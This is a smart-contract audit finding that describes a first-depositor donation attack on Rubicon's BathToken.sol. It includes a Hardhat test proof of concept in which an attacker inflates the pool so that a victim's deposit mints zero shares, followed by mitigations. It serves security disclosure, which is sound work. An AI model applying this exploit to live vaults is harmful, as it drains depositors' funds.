## Vulnerability Title

[H-04] First depositor can break minting of shares

### Overview


This bug report is about a vulnerability that affects Rubicon Protocol's BathToken.sol smart contract. The vulnerability allows an attacker to manipulate the total asset amount and prevent users from receiving shares in exchange for their deposits. The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf).

The bug is located in lines 569-571 of the BathToken.sol smart contract, which calculates the allocation of shares. An early attacker can exploit this by calling the `openBathTokenSpawnAndSignal()` function with an initial liquidity of `1` and then transferring a large amount of underlying tokens to the bath token contract. If a victim then deposits an amount less than the amount transferred by the attacker, they will receive no shares in return for their deposit.

To avoid this issue, Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. The same can be done in this case. Additionally, the `_deposit()` function should ensure that the number of shares to be minted is non-zero.

### Original Finding Content

The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\_ToB_yearn_vaultsv2/ToB\_-\_Yearn_Vault_v\_2\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

### Proof of Concept

In `BathToken.sol:569-571`, the allocation of shares is calculated as follows:

```js
(totalSupply == 0) ? shares = assets : shares = (
    assets.mul(totalSupply)
).div(_pool);
```

An early attacker can exploit this by:

*   Attacker calls `openBathTokenSpawnAndSignal()` with `initialLiquidityNew = 1`, creating a new bath token with `totalSupply = 1`
*   Attacker transfers a large amount of underlying tokens to the bath token contract, such as `1000000`
*   Using `deposit()`, a victim deposits an amount less than `1000000`, such as `1000`:
    *   `assets = 1000`
    *   `(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001`, which would round down to `0`
    *   Thus, the victim receives no shares in return for his deposit

To avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.

```js
it("Victim receives 0 shares", async () => {
    // 1. Attacker deposits 1 testCoin first when creating the liquidity pool
    const initialLiquidityNew = 1;
    const initialLiquidityExistingBathToken = ethers.utils.parseUnits("100", decimals);
    
    // Approve DAI and testCoin for bathHouseInstance
    await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {
        from: attacker,
    });
    await DAIInstance.approve(
        bathHouseInstance.address,
        initialLiquidityExistingBathToken,
        { from: attacker }
    );

    // Call open creation function, attacker deposits only 1 testCoin
    const desiredPairedAsset = await DAIInstance.address;
    await bathHouseInstance.openBathTokenSpawnAndSignal(
        await testCoin.address,
        initialLiquidityNew,
        desiredPairedAsset,
        initialLiquidityExistingBathToken,
        { from: attacker }
    );
    
    // Retrieve resulting bathToken address
    const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);
    const _newBathToken = await BathToken.at(newbathTokenAddress);

    // 2. Attacker deposits large amount of testCoin into liquidity pool
    let attackerAmt = ethers.utils.parseUnits("1000000", decimals);
    await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});
    await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});

    // 3. Victim deposits a smaller amount of testCoin, receives 0 shares
    // In this case, we use (1 million - 1) testCoin
    let victimAmt = ethers.utils.parseUnits("999999", decimals);
    await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});
    await _newBathToken.deposit(victimAmt, victim, {from: victim});
    
    assert.equal(await _newBathToken.balanceOf(victim), 0);
});
```

### Recommended Mitigation Steps

*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
*   In `_deposit()`, ensure the number of shares to be minted is non-zero:

`require(shares != 0, "No shares minted");`
